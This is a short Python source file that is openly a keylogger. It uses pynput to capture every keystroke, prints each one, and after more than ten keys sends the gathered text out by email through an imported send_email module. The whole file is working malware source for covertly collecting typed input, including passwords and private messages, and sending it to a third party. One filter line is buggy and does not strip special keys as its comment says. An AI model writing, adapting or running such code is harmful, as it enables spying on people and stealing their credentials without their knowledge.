import pynput
from pynput.keyboard import Key, Listener
import send_email

count = 0  # Initialize a counter for keystrokes
keys = []  # Initialize an empty list to store keystrokes

# Function to handle key press events
def on_press(key):
    print(key, end=" ")  # Print the key that was pressed
    print("pressed")
    global keys, count  # Access global variables
    keys.append(str(key))  # Append the pressed key to the list
    count += 1  # Increment the counter

    # When the counter reaches 10 keystrokes, send the recorded keys via email
    if count > 10:
        count = 0
        email(keys)

# Function to format and send email
def email(keys):
    message = ""  # Initialize an empty message
    for key in keys:
        k = key.replace("'", "")  # Remove single quotes around the key
        if key == "Key.space":
            k = " "  # Replace "Key.space" with a space
        elif key.find("Key") > 0:
            k = ""  # Ignore other special keys
        message += k  # Add the cleaned key to the message

    print(message)  # Print the cleaned message
    send_email.sendEmail(message)  # Call the sendEmail function from send_email.py

# Function to handle key release events
def on_release(key):
    if key == Key.esc:  # If the 'Esc' key is released, stop the keylogger
        return False

# Create a listener for keyboard events, specifying the event handlers
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()  # Start listening for keyboard events
